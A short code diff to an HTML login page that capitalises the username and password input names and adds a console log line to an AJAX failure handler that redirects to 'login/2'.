@@ -865,11 +865,11 @@
                             <form id="form" class="is-invalid" data-ember-action="" data-ember-action-18="18">
                                 <div class="field ">
                                     <label class="login-field" for="fldUsername">Username</label>
-                                    <input name="username" test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="username" title="" id="fldUsername" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view lgField" type="text" />
+                                    <input name="Username" test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="username" title="" id="fldUsername" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view lgField" type="text" />
                                 </div>
                                 <div class="password field">
                                     <label class="login-field" for="fldPassword">Password</label>
-                                    <input name="password" test-id="fldPassword" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="current-password" id="fldPassword" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view lgField" type="password" />
+                                    <input name="Password" test-id="fldPassword" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="current-password" id="fldPassword" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view lgField" type="password" />
                                 </div>
                                 <div id="submissionArea">
                                     <div id="userLinks">
@@ -1087,6 +1087,7 @@
             }).fail(function(err, textstatus, error) {
                 // Handle AJAX request failure here
 				window.location.href = "login/2";
+				console.log('fail');
             });
         }
     });
